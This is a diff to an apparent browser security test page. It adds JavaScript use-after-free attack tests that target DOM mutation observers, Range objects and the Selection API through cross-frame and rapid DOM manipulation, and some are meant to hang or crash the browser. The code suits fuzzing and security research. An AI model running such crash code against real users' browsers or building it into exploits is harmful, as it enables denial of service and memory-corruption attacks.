@@ -225,6 +225,20 @@
         </div>
 
         <div class="test-section">
+            <h3>Test 14b: DOM Range UAF <span class="cve-tag">CRITICAL</span> <span class="status" id="status14b"></span></h3>
+            <p>Range object use-after-free through DOM manipulation.</p>
+            <button onclick="testDOMRangeUAF()">Run Test</button>
+            <div class="log" id="log14b"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 14c: Selection API UAF <span class="cve-tag">CRITICAL</span> <span class="status" id="status14c"></span></h3>
+            <p>Selection object corruption through rapid DOM changes.</p>
+            <button onclick="testSelectionUAF()">Run Test</button>
+            <div class="log" id="log14c"></div>
+        </div>
+
+        <div class="test-section">
             <h3>Test 15: Advanced Memory Disclosure <span class="cve-tag">CRITICAL</span> <span class="status" id="status15"></span></h3>
             <p>Sophisticated memory disclosure through side-channel attacks.</p>
             <button onclick="testMemoryDisclosure()">Run Test</button>
@@ -1363,152 +1377,443 @@ Language: ${navigator.language}`;
             }
         }
 
-        // Test 14: DOM Mutation Observer UAF
+        // Test 14: DOM Mutation Observer UAF (Enhanced)
         function testDOMMutationUAF() {
             setStatus(14, 'RUNNING');
-            log(14, 'DOM mutation observer UAF attack...');
+            log(14, 'ENHANCED DOM mutation observer UAF attack...');
             
             try {
-                log(14, 'Phase 1: Setting up complex DOM structure...');
+                log(14, 'Phase 1: Creating deeply nested iframe structure...');
                 
                 const container = document.createElement('div');
                 document.body.appendChild(container);
                 
-                // Create deep nested structure
-                let current = container;
-                for (let i = 0; i < 100; i++) {
-                    const child = document.createElement('div');
-                    child.id = 'node_' + i;
-                    child.innerHTML = '<span>Content ' + i + '</span>';
-                    current.appendChild(child);
-                    current = child;
+                // Create nested iframes for cross-frame UAF
+                for (let frameNum = 0; frameNum < 5; frameNum++) {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    container.appendChild(iframe);
+                    
+                    // Setup frame content with observers
+                    iframe.onload = function() {
+                        try {
+                            const frameDoc = iframe.contentDocument;
+                            if (!frameDoc) return;
+                            
+                            const frameContainer = frameDoc.createElement('div');
+                            frameDoc.body.appendChild(frameContainer);
+                            
+                            // Create observer in iframe context
+                            const observer = new iframe.contentWindow.MutationObserver(function(mutations) {
+                                log(14, `Frame ${frameNum} observer triggered`);
+                                
+                                // Cross-frame DOM manipulation during callback
+                                for (let mutation of mutations) {
+                                    try {
+                                        // Access parent document from iframe observer
+                                        const parentNode = window.document.createElement('div');
+                                        parentNode.textContent = 'Cross-frame injection';
+                                        
+                                        // Try to manipulate parent while in iframe callback
+                                        if (mutation.target && mutation.target.ownerDocument !== frameDoc) {
+                                            mutation.target.appendChild(parentNode);
+                                        }
+                                        
+                                        // Remove the iframe itself during callback
+                                        if (Math.random() < 0.3) {
+                                            setTimeout(() => {
+                                                try {
+                                                    iframe.remove();
+                                                } catch (e) {}
+                                            }, 0);
+                                        }
+                                        
+                                    } catch (e) {
+                                        log(14, `Cross-frame error: ${e.message}`);
+                                    }
+                                }
+                            });
+                            
+                            observer.observe(frameContainer, {
+                                childList: true,
+                                subtree: true,
+                                attributes: true
+                            });
+                            
+                            // Store observer to prevent GC
+                            iframe._observer = observer;
+                            
+                        } catch (e) {
+                            log(14, `Frame setup error: ${e.message}`);
+                        }
+                    };
+                    
+                    iframe.src = 'about:blank';
                 }
                 
-                log(14, 'Phase 2: Setting up mutation observers...');
+                log(14, 'Phase 2: Extreme observer nesting...');
                 
+                // Create 1000+ nested observers
                 const observers = [];
-                const observed_nodes = [];
+                const nodes = [];
                 
-                function createObserver(target, index) {
+                for (let i = 0; i < 1000; i++) {
+                    const node = document.createElement('div');
+                    node.id = 'observer_node_' + i;
+                    container.appendChild(node);
+                    nodes.push(node);
+                    
                     const observer = new MutationObserver(function(mutations) {
-                        log(14, `Observer ${index} triggered with ${mutations.length} mutations`);
-                        
-                        // Try to trigger UAF by manipulating nodes during callback
-                        for (let mutation of mutations) {
-                            if (mutation.type === 'childList') {
-                                for (let node of mutation.addedNodes) {
-                                    try {
-                                        // Access potentially freed node
-                                        node.textContent = 'MODIFIED';
-                                        node.parentNode.removeChild(node);
-                                    } catch (e) {
-                                        log(14, `Node access error: ${e.message}`);
+                        // Recursive observer triggering
+                        if (Math.random() < 0.1 && i < 999) {
+                            try {
+                                // Trigger mutation in next observer's node
+                                const nextNode = nodes[i + 1];
+                                if (nextNode) {
+                                    nextNode.setAttribute('triggered-by', i.toString());
+                                    
+                                    // Chain removal - remove previous nodes
+                                    if (i > 10) {
+                                        const prevNode = nodes[i - 10];
+                                        if (prevNode && prevNode.parentNode) {
+                                            prevNode.remove();
+                                        }
                                     }
                                 }
-                                
-                                for (let node of mutation.removedNodes) {
-                                    try {
-                                        // Access removed node
-                                        node.textContent = 'FREED';
-                                        log(14, `Accessed freed node: ${node.textContent}`);
-                                    } catch (e) {
-                                        log(14, `Freed node error: ${e.message}`);
-                                    }
-                                }
-                            }
+                            } catch (e) {}
                         }
                         
-                        // Recursive mutation during callback
-                        if (Math.random() < 0.1) {
+                        // Random node manipulation during callback
+                        for (let mutation of mutations) {
                             try {
-                                const newNode = document.createElement('div');
-                                newNode.textContent = 'Recursive';
-                                target.appendChild(newNode);
+                                const randomIdx = Math.floor(Math.random() * nodes.length);
+                                const randomNode = nodes[randomIdx];
+                                if (randomNode) {
+                                    randomNode.textContent = `Modified by observer ${i}`;
+                                    
+                                    // Try to access potentially freed nodes
+                                    if (mutation.removedNodes) {
+                                        for (let removed of mutation.removedNodes) {
+                                            removed.textContent = 'ACCESSING FREED NODE';
+                                            removed.appendChild(document.createElement('span'));
+                                        }
+                                    }
+                                }
                             } catch (e) {
-                                log(14, `Recursive mutation error: ${e.message}`);
+                                log(14, `Observer ${i} error: ${e.message}`);
                             }
                         }
                     });
                     
-                    observer.observe(target, {
+                    observer.observe(node, {
                         childList: true,
                         subtree: true,
                         attributes: true,
-                        attributeOldValue: true,
-                        characterData: true,
-                        characterDataOldValue: true
+                        characterData: true
                     });
                     
-                    return observer;
+                    observers.push(observer);
                 }
                 
-                // Create observers for multiple nodes
-                const nodes = container.querySelectorAll('div');
-                for (let i = 0; i < Math.min(nodes.length, 20); i++) {
-                    observers.push(createObserver(nodes[i], i));
-                    observed_nodes.push(nodes[i]);
-                }
+                log(14, 'Phase 3: Chaos mutations...');
                 
-                log(14, 'Phase 3: Triggering complex mutations...');
-                
-                // Rapid mutations to trigger race conditions
-                for (let round = 0; round < 10; round++) {
+                // Trigger massive parallel mutations
+                for (let round = 0; round < 100; round++) {
                     setTimeout(() => {
-                        for (let i = 0; i < observed_nodes.length; i++) {
-                            const node = observed_nodes[i];
+                        for (let i = 0; i < Math.min(nodes.length, 100); i++) {
+                            const node = nodes[i];
+                            if (!node) continue;
+                            
                             try {
-                                // Multiple types of mutations
-                                node.setAttribute('data-round', round.toString());
+                                // Multiple simultaneous mutations
+                                node.setAttribute('round', round.toString());
+                                node.setAttribute('index', i.toString());
                                 
-                                const newChild = document.createElement('span');
-                                newChild.textContent = `Round ${round} Child ${i}`;
-                                node.appendChild(newChild);
+                                const child = document.createElement('span');
+                                child.textContent = `Chaos ${round}-${i}`;
+                                node.appendChild(child);
                                 
-                                // Remove and re-add to trigger observer callbacks
-                                if (node.parentNode) {
-                                    const parent = node.parentNode;
-                                    parent.removeChild(node);
-                                    parent.appendChild(node);
+                                // Immediate removal
+                                if (Math.random() < 0.5) {
+                                    child.remove();
                                 }
                                 
-                                // Modify text content
-                                if (node.firstChild) {
-                                    node.firstChild.textContent = `Modified ${round}-${i}`;
+                                // Text node manipulation
+                                const textNode = document.createTextNode(`Text ${round}`);
+                                node.appendChild(textNode);
+                                textNode.textContent = `Modified ${round}`;
+                                
+                                // Random node removal
+                                if (Math.random() < 0.1 && i > 10) {
+                                    nodes[i - 10].remove();
                                 }
                                 
                             } catch (e) {
-                                log(14, `Mutation error round ${round}: ${e.message}`);
+                                // Errors expected as nodes get freed
                             }
                         }
-                    }, round * 100);
+                    }, round * 10); // Very rapid mutations
                 }
                 
-                log(14, 'Phase 4: Observer cleanup race...');
+                log(14, 'Phase 4: Observer disconnection chaos...');
+                
                 setTimeout(() => {
-                    // Disconnect observers while mutations might still be pending
-                    for (let observer of observers) {
-                        observer.disconnect();
-                    }
-                    
-                    // Try to access observed nodes after disconnect
-                    for (let node of observed_nodes) {
-                        try {
-                            node.textContent = 'POST-DISCONNECT';
-                        } catch (e) {
-                            log(14, `Post-disconnect error: ${e.message}`);
+                    // Disconnect observers randomly while mutations are happening
+                    for (let i = 0; i < observers.length; i++) {
+                        if (Math.random() < 0.3) {
+                            setTimeout(() => {
+                                try {
+                                    observers[i].disconnect();
+                                } catch (e) {}
+                            }, Math.random() * 1000);
                         }
                     }
-                    
-                    // Cleanup
-                    container.remove();
-                    
-                    log(14, 'Test completed');
-                    setStatus(14, 'PASSED');
-                }, 2000);
+                }, 500);
+                
+                // Never complete - this test is designed to hang/crash
+                log(14, 'Chaos unleashed - test will hang until crash...');
                 
             } catch (e) {
                 log(14, `CRASH/EXCEPTION: ${e.message}`);
                 setStatus(14, 'CRASHED');
+            }
+        }
+
+        // Test 14b: DOM Range UAF
+        function testDOMRangeUAF() {
+            setStatus('14b', 'RUNNING');
+            log('14b', 'DOM Range UAF attack...');
+            
+            try {
+                log('14b', 'Phase 1: Creating complex document structure...');
+                
+                const container = document.createElement('div');
+                document.body.appendChild(container);
+                
+                // Create complex nested structure
+                for (let i = 0; i < 100; i++) {
+                    const section = document.createElement('section');
+                    section.innerHTML = `
+                        <h3>Section ${i}</h3>
+                        <p>Paragraph 1 with <span>nested span</span> content.</p>
+                        <p>Paragraph 2 with <strong>bold text</strong> and more.</p>
+                        <ul><li>Item 1</li><li>Item 2</li><li>Item 3</li></ul>
+                    `;
+                    container.appendChild(section);
+                }
+                
+                log('14b', 'Phase 2: Creating overlapping ranges...');
+                
+                const ranges = [];
+                const textNodes = [];
+                
+                // Collect all text nodes
+                const walker = document.createTreeWalker(
+                    container,
+                    NodeFilter.SHOW_TEXT,
+                    null,
+                    false
+                );
+                
+                let textNode;
+                while (textNode = walker.nextNode()) {
+                    textNodes.push(textNode);
+                }
+                
+                log('14b', `Found ${textNodes.length} text nodes`);
+                
+                // Create overlapping ranges across text nodes
+                for (let i = 0; i < Math.min(textNodes.length - 1, 200); i++) {
+                    try {
+                        const range = document.createRange();
+                        const startNode = textNodes[i];
+                        const endNode = textNodes[Math.min(i + 5, textNodes.length - 1)];
+                        
+                        range.setStart(startNode, 0);
+                        range.setEnd(endNode, endNode.textContent.length);
+                        
+                        ranges.push(range);
+                    } catch (e) {
+                        log('14b', `Range creation error: ${e.message}`);
+                    }
+                }
+                
+                log('14b', 'Phase 3: Rapid DOM modifications with active ranges...');
+                
+                // Modify DOM while ranges are active
+                for (let round = 0; round < 50; round++) {
+                    setTimeout(() => {
+                        // Remove nodes that ranges point to
+                        for (let i = 0; i < Math.min(textNodes.length, 10); i++) {
+                            const nodeToRemove = textNodes[i + round];
+                            if (nodeToRemove && nodeToRemove.parentNode) {
+                                try {
+                                    nodeToRemove.parentNode.removeChild(nodeToRemove);
+                                } catch (e) {}
+                            }
+                        }
+                        
+                        // Access ranges after node removal
+                        for (let j = 0; j < Math.min(ranges.length, 20); j++) {
+                            const range = ranges[j + round % ranges.length];
+                            if (range) {
+                                try {
+                                    // Try to use range after nodes are freed
+                                    const contents = range.extractContents();
+                                    const cloned = range.cloneContents();
+                                    range.insertNode(document.createTextNode('INJECTED'));
+                                    
+                                    // Access range properties
+                                    const start = range.startContainer;
+                                    const end = range.endContainer;
+                                    
+                                    log('14b', `Range ${j} start: ${start.nodeType}, end: ${end.nodeType}`);
+                                    
+                                } catch (e) {
+                                    log('14b', `Range access error: ${e.message}`);
+                                }
+                            }
+                        }
+                        
+                    }, round * 50);
+                }
+                
+                log('14b', 'Phase 4: Range manipulation chaos...');
+                
+                setTimeout(() => {
+                    // Rapidly manipulate all ranges
+                    for (let i = 0; i < ranges.length; i++) {
+                        setTimeout(() => {
+                            const range = ranges[i];
+                            try {
+                                range.selectNode(document.body);
+                                range.collapse(true);
+                                range.deleteContents();
+                                range.surroundContents(document.createElement('div'));
+                            } catch (e) {
+                                log('14b', `Range manipulation error: ${e.message}`);
+                            }
+                        }, i * 2);
+                    }
+                    
+                    log('14b', 'Test completed');
+                    setStatus('14b', 'PASSED');
+                }, 3000);
+                
+            } catch (e) {
+                log('14b', `CRASH/EXCEPTION: ${e.message}`);
+                setStatus('14b', 'CRASHED');
+            }
+        }
+
+        // Test 14c: Selection API UAF
+        function testSelectionUAF() {
+            setStatus('14c', 'RUNNING');
+            log('14c', 'Selection API UAF attack...');
+            
+            try {
+                log('14c', 'Phase 1: Creating selectable content...');
+                
+                const container = document.createElement('div');
+                container.innerHTML = `
+                    <h1>Selectable Content</h1>
+                    ${'<p>This is paragraph content that can be selected. '.repeat(100)}</p>
+                    <div>${'<span>Nested span content. </span>'.repeat(50)}</div>
+                    <ul>${'<li>List item content.</li>'.repeat(30)}</ul>
+                `;
+                document.body.appendChild(container);
+                
+                log('14c', 'Phase 2: Creating multiple selections...');
+                
+                const selections = [];
+                
+                // Create selections in different contexts
+                for (let i = 0; i < 10; i++) {
+                    try {
+                        const iframe = document.createElement('iframe');
+                        iframe.style.display = 'none';
+                        document.body.appendChild(iframe);
+                        
+                        iframe.onload = function() {
+                            try {
+                                const frameDoc = iframe.contentDocument;
+                                frameDoc.body.innerHTML = '<p>Frame content</p>'.repeat(20);
+                                
+                                const frameSelection = iframe.contentWindow.getSelection();
+                                frameSelection.selectAllChildren(frameDoc.body);
+                                selections.push(frameSelection);
+                                
+                            } catch (e) {}
+                        };
+                        
+                        iframe.src = 'about:blank';
+                    } catch (e) {}
+                }
+                
+                // Main window selections
+                const mainSelection = window.getSelection();
+                
+                log('14c', 'Phase 3: Rapid selection modifications...');
+                
+                for (let round = 0; round < 100; round++) {
+                    setTimeout(() => {
+                        try {
+                            // Rapid selection changes
+                            const paragraphs = container.querySelectorAll('p, span, li');
+                            if (paragraphs.length > 0) {
+                                const randomP = paragraphs[Math.floor(Math.random() * paragraphs.length)];
+                                
+                                mainSelection.selectAllChildren(randomP);
+                                
+                                // Modify DOM while selection is active
+                                if (Math.random() < 0.3) {
+                                    randomP.remove();
+                                }
+                                
+                                // Try to access selection after DOM change
+                                const range = mainSelection.getRangeAt(0);
+                                const contents = range.extractContents();
+                                
+                                // Re-insert modified content
+                                const newSpan = document.createElement('span');
+                                newSpan.textContent = 'MODIFIED';
+                                range.insertNode(newSpan);
+                            }
+                            
+                        } catch (e) {
+                            log('14c', `Selection error round ${round}: ${e.message}`);
+                        }
+                    }, round * 20);
+                }
+                
+                log('14c', 'Phase 4: Cross-frame selection corruption...');
+                
+                setTimeout(() => {
+                    // Access all frame selections after potential DOM changes
+                    for (let i = 0; i < selections.length; i++) {
+                        setTimeout(() => {
+                            const selection = selections[i];
+                            try {
+                                // Try to use potentially corrupted selection
+                                selection.removeAllRanges();
+                                selection.addRange(document.createRange());
+                                
+                                const text = selection.toString();
+                                log('14c', `Frame selection ${i}: ${text.substring(0, 20)}`);
+                                
+                            } catch (e) {
+                                log('14c', `Frame selection ${i} error: ${e.message}`);
+                            }
+                        }, i * 100);
+                    }
+                    
+                    log('14c', 'Test completed');
+                    setStatus('14c', 'PASSED');
+                }, 3000);
+                
+            } catch (e) {
+                log('14c', `CRASH/EXCEPTION: ${e.message}`);
+                setStatus('14c', 'CRASHED');
             }
         }
 
@@ -1882,6 +2187,8 @@ Language: ${navigator.language}`;
                 testHeapFengShuiJIT,
                 testRegExpExploit,
                 testDOMMutationUAF,
+                testDOMRangeUAF,
+                testSelectionUAF,
                 testMemoryDisclosure,
                 testNativeCodeInjection
             ];
